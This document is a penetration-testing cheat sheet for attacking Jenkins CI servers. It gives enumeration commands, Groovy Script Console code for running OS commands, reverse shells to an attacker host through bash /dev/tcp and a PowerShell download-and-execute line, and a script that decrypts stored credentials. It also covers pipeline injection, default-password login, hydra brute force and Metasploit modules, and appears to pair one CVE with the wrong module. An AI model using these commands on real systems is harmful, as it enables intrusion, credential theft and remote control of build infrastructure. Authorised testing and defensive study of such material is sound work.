#Jenkins #CICD #automation #Groovy #webservices

## What is Jenkins?
Open-source CI/CD automation server. Widely used for build pipelines. Key attack surface: Groovy Script Console allows arbitrary OS command execution as the Jenkins service account (often SYSTEM on Windows or jenkins/root on Linux).

- Port: **TCP 8080** (default HTTP)
- Port: **TCP 8443** (HTTPS)
- Port: **TCP 50000** — JNLP agent communication
- Script Console: `/script`
- Credential store: `/credentials`
- Config: `$JENKINS_HOME/config.xml`, `$JENKINS_HOME/secrets/`

---

## Enumeration

```bash
# Nmap
nmap -p 8080,8443,50000 --script http-title,banner -sV <target>

# Check version (header + page)
curl -s http://<target>:8080/ | grep -i "jenkins\|version"
curl -I http://<target>:8080/

# Access script console (if unauthenticated or after auth)
curl http://<target>:8080/script

# Check for unauthenticated access
curl -s http://<target>:8080/api/json | python3 -m json.tool

# gobuster for paths
gobuster dir -u http://<target>:8080 -w /usr/share/wordlists/dirb/common.txt

# Metasploit
use auxiliary/scanner/http/jenkins_enum
```

---

## Connect / Access

```bash
# Web interface
http://<target>:8080

# Jenkins API
curl http://<target>:8080/api/json
curl -u <user>:<pass> http://<target>:8080/api/json

# Script console (authenticated)
http://<target>:8080/script

# Jenkins CLI
java -jar jenkins-cli.jar -s http://<target>:8080 who-am-i
java -jar jenkins-cli.jar -s http://<target>:8080 -auth user:pass groovy =  # stdin groovy
```

---

## Attack Vectors

### Groovy Script Console RCE

Navigate to: `Manage Jenkins → Script Console` (or `/script`)

```groovy
// OS command execution
println "id".execute().text
println "whoami".execute().text

// Windows
println "cmd /c whoami".execute().text

// Reverse shell (Linux)
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"]
cmd.execute()

// Reverse shell (Windows)
def cmd = "powershell.exe -nop -NonInteractive -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/shell.ps1')"
cmd.execute()

// Read file
println new File("/etc/passwd").text
println new File("C:\\Windows\\System32\\drivers\\etc\\hosts").text

// List directory
println "ls /".execute().text
println new File("/").list()

// Write file
new File("/tmp/shell.sh").text = "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"
"chmod +x /tmp/shell.sh".execute()
"/tmp/shell.sh".execute()
```

```bash
# Via Jenkins API (if unauthenticated)
curl -d "script=println+%27id%27.execute().text" http://<target>:8080/scriptText

# Authenticated
curl -u <user>:<pass> --data-urlencode "script=println 'id'.execute().text" http://<target>:8080/scriptText
```

### Unauthenticated Access

```bash
# Check if instance allows anonymous access
curl -s http://<target>:8080/api/json | python3 -m json.tool
curl -s http://<target>:8080/script   # if no redirect = accessible

# Older Jenkins (<2.x) — admin/admin default
curl http://<target>:8080/j_acegi_security_check -d "j_username=admin&j_password=admin&from=&Submit=Sign+in"
```

### Credential Extraction

```bash
# Jenkins stores credentials encrypted in $JENKINS_HOME/credentials.xml
# Decrypt via Script Console (if access obtained):
import com.cloudbees.plugins.credentials.SystemCredentialsProvider
import com.cloudbees.plugins.credentials.common.UsernamePasswordCredentials

def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
)

for (c in creds) {
    println c.username + " / " + c.password.plainText
}
```

### Pipeline Script Injection

```groovy
// If you control a Jenkinsfile or build parameter:
pipeline {
    agent any
    stages {
        stage('Exploit') {
            steps {
                sh 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
            }
        }
    }
}
```

### CVE-2018-1000861 — RCE via Stapler Framework

```bash
# Unauthenticated RCE on Jenkins < 2.138.2 / 2.153
use exploit/multi/http/jenkins_metaprogramming
```

### CVE-2019-1003000 — Sandbox Bypass / RCE

```bash
# Script sandbox bypass — allows pipeline Groovy RCE
use exploit/multi/http/jenkins_script_console
```

### Brute Force

```bash
hydra -L users.txt -P passwords.txt http-form-post://<target>:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Sign+in:Invalid
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Script console accessible without auth | Direct OS RCE |
| Anonymous read access | Info disclosure, may expose builds |
| Weak admin credentials | Full RCE via script console |
| Old Jenkins version | Known RCE CVEs |
| Credentials stored in Jenkins | Extraction via script console |
| Agents with JNLP (50000) exposed | Agent hijacking |

---

## Quick Reference

| Goal | Command |
|---|---|
| Check access | `curl http://host:8080/api/json` |
| Script console | `http://host:8080/script` |
| RCE (Groovy) | `println "id".execute().text` |
| RCE (curl, unauth) | `curl -d "script=..." http://host:8080/scriptText` |
| Reverse shell | `def cmd = ["bash","-c","bash -i >& /dev/tcp/attacker/port 0>&1"]; cmd.execute()` |
| Extract creds | Groovy credential enumeration via Script Console |
| MSF | `exploit/multi/http/jenkins_script_console` |
